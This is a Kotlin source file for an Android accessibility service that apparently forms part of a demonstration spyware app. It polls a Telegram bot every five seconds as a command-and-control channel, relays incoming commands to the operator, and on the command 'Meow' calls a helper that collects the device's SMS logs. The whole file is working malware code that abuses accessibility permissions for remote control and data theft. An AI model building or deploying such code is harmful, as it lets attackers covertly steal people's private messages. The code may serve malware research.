package cocomelonc.hack.services

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import cocomelonc.hack.tools.HackNetwork
import cocomelonc.hack.tools.HackSmsLogs
import kotlinx.coroutines.*

class HackTelegramAccessibilityService : AccessibilityService() {

    private var lastUpdateId = 0
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    companion object {
        private const val TAG = "HackTelegramService"
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "accessibility service connected")
        serviceScope.launch {
            listenToTelegram()
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // not used
    }

    override fun onInterrupt() {
        Log.d(TAG, "accessibility service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }

    private suspend fun listenToTelegram() {
        val network = HackNetwork(applicationContext)
        while (true) {
            try {
                val updatesResponse = network.getUpdates(lastUpdateId) // new messages
                val updates = updatesResponse?.updates()

                if (updates != null) {
                    for (update in updates) {
                        // message test
                        val message = update.message().text()
                        network.sendTextMessage("New message received: $message")
                        Log.d(TAG, "New message received: $message")
                        processCommand(message)
                        lastUpdateId = update.updateId() + 1
                    }
                }
            } catch (e: Exception) {
                Log.d(TAG, e.toString())
            }
            // sleep
            Thread.sleep(5000)  // every 5 sec
        }
    }

    private fun processCommand(command: String) {
        if (command.contains("Meow", ignoreCase = true)) {
            HackSmsLogs(applicationContext).getSmsLogs()
        } else {
            HackNetwork(applicationContext).sendTextMessage("Unknown command: $command")
        }
    }
}
